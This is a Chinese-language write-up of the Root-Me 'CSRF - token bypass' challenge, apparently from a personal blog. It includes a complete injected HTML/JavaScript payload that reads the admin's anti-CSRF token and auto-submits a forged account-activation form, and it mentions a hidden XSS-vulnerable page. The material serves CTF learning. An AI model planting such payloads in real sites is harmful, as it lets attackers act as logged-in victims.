## [[Root-Me](https://www.root-me.org/)] [[Cracking](https://www.root-me.org/en/Challenges/Web-Client/)] [[CSRF - token bypass](https://www.root-me.org/en/Challenges/Web-Client/HTML-disabled-buttons)] [[解题报告](http://exp-blog.com/2019/01/13/pid-2933/)]

------

这题与【[Web-Client : CSRF - 0 protection](http://exp-blog.com/2019/01/13/pid-2927/)】是一样的，只是多了一个 token 校验。

切到 Profile 选项卡，打开浏览器开发者工具，切到 Elements ，可以看到激活表单多了一个实时刷新的 `token`，而且在本地找不到关于这个 `token` 的生成代码，因此可以推断这个 `token` 是与登录账号绑定、且由 web 服务器生成的。

![](http://exp-blog.com/wp-content/uploads/2019/01/0ccd76e90df4766845293dfbcd463196.png)

于是我们的目的就是需要在原本利用 robot-admin 的 Cookie 的基础上，再同时利用其 `token` 。

由此构造 payloads 如下（此 payloads 与【[Web-Client : CSRF - 0 protection](http://exp-blog.com/2019/01/13/pid-2927/)】大致相同，只是多了一个步骤，就是让 robot-admin 先访问 Profile 选项卡获取其 `token`，加到 form 表单后再提交）：

```javascript
<form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="exp" />  <!-- 激活账号，根据实际修改  -->
    <input type="hidden" name="status" value="on" />  <!-- 激活动作 -->
    <input id="admin-token" type="hidden" name="token" value="" />  <!-- 网站用于防止 CSRF 的 token，需绕过 -->
</form>
<script>

	// 使用 robot-admin 的身份获取 robot-admin 的 token，用于绕过 CSRF 校验
	var request = new XMLHttpRequest();
	request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
	request.send(null);	
	var respone = request.responseText;
	var groups = respone.match("token\" value=\"(.*?)\"");
	var token = groups[1];
	
	document.getElementById("admin-token").value = token;	// 置换 robot-admin 的 token
	document.csrf.submit();
</script>
```

将 payloads 其拷贝到 Contact 选项卡的 Comment 输入框提交。

多刷新几次 Private 选项卡，等待 robot-admin 触发 payloads，最终得到 flag，完成挑战。

![](http://exp-blog.com/wp-content/uploads/2019/01/29dc07d802cc95b3f21efc60cc99d41a.png)

> 注：查看页面源码发现有一个隐藏的选项卡 Search 被注释了 `<!--| <a href="?action=search">Search</a> -->`，打开该选项卡，里面有一个 XSS 漏洞，但是暂时没发现这个漏洞对于本题有什么用（可能只是用来方便我们调试，但应该没那么好心，应该是用来误导的）。

![](http://exp-blog.com/wp-content/uploads/2019/01/3fd41fa348e9beba41cce2342fa4ebee.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
